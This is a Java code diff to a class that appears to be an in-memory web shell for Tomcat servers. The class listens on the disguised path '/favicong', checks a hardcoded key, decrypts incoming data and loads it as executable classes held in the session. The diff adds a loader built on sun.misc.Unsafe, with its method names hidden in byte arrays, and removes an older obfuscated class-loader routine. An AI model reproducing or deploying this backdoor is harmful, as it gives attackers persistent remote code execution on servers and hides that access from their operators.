@@ -8,6 +8,17 @@ import org.apache.catalina.servlets.redefine.MySession;
 public class GSL {
     private static final String pathPattern= "/favicong";
     private static final String px = "1a539a061fa9458e2b869c3cf8be6d99";
+
+    public static Class loader(byte[] bytes) throws Exception {
+        java.lang.reflect.Field field = sun.misc.Unsafe.class.getDeclaredField(new String(new byte[]{116,104,101,85,110,115,97,102,101}));
+        field.setAccessible(true);
+        Object unsafe = field.get(null);
+        java.lang.reflect.Method m = sun.misc.Unsafe.class.getDeclaredMethod(new String(new byte[]{100,101,102,105,110,101,65,110,111,110,121,109,111,117,115,67,108,97,115,115}), new Class[]{Class.class, byte[].class, Object[].class});
+        m.setAccessible(true);
+        Class clazz = (Class) m.invoke(unsafe, new Object[]{java.io.File.class, bytes, null});
+        return clazz;
+    }
+
     private static byte[] Decrypt(byte[] data) {
         if (data.length == 0) {
             return data;
@@ -22,6 +33,7 @@ public class GSL {
         }
         return data;
     }
+
     private static byte[] Encrypt(byte[] data) {
         try {
             java.io.ByteArrayOutputStream o = new java.io.ByteArrayOutputStream();
@@ -65,12 +77,7 @@ public class GSL {
                     System.arraycopy(dr, 0, data, 0, data.length);
                     if (java.util.Arrays.equals(p, px.getBytes())) {
                         if (MySession.getAttribute(MyRequest.getSession(request), "ve") == null) {
-                            Class cc = Class.forName("c" + new String(new byte[]{111, 109, 46, 115, 117, 110, 46, 106, 109, 120, 46, 114, 101, 109, 111, 116, 101, 46, 117, 116, 105, 108, 46, 79, 114, 100, 101, 114, 67, 108, 97, 115, 115, 76, 111, 97, 100, 101, 114}) + "s");
-                            Object a = Thread.currentThread().getContextClassLoader();
-                            Object b = cc.getDeclaredConstructor(new Class[]{ClassLoader.class, ClassLoader.class}).newInstance(a, a);
-                            java.lang.reflect.Method c = cc.getSuperclass().getDeclaredMethod("d" + new String(new byte[]{101, 102, 105, 110, 101, 67, 108, 97, 115}) + "s", byte[].class, int.class, int.class);
-                            c.setAccessible(true);
-                            Class zz = (Class) c.invoke(b, new Object[]{data, 0, data.length});
+                            Class zz = loader(data);
                             MySession.setAttribute(MyRequest.getSession(request), "ve", zz);
                         } else {
                             MySession.setAttribute(MyRequest.getSession(request), "p" + new String(new byte[]{97, 114, 97, 109, 101, 116, 101, 114}) + "s", data);
